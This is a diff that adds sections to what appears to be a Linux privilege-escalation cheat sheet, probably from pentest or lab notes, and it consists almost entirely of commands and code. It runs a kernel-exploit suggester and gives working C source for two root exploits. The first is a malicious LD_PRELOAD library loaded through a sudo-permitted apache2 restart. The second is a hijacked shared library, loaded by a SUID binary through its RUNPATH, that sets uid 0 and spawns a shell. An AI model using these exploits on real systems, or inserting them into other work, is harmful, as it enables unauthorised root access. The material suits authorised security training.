@@ -299,3 +299,66 @@ chmod u+s /mnt/shell
 
 ./shell
 ```
+
+# Kernel Exploit
+```powershell
+linux-exploit-suggester.sh
+```
+
+# Shared Libraries
+```powershell
+sudo -l
+
+Matching Defaults entries for daniel.carter on NIX02:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User daniel.carter may run the following commands on NIX02:
+    (root) NOPASSWD: /usr/sbin/apache2 restart
+
+root.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
+
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+```
+
+# Shared Object Hijacking
+```powershell
+ls -la /path/to/suid_binary
+ldd /path/to/suid_binary
+
+./linpeas.sh | grep -A5 "Shared Library"
+
+readelf -d payroll  | grep PATH
+
+ldd payroll
+  linux-vdso.so.1 (0x00007ffd22bbc000)
+  libshared.so => /development/libshared.so (0x00007f0c13112000)
+  /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
+
+cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
+
+src.c
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+}
+
+gcc src.c -fPIC -shared -o /development/libshared.so
+
+./payroll 
+```
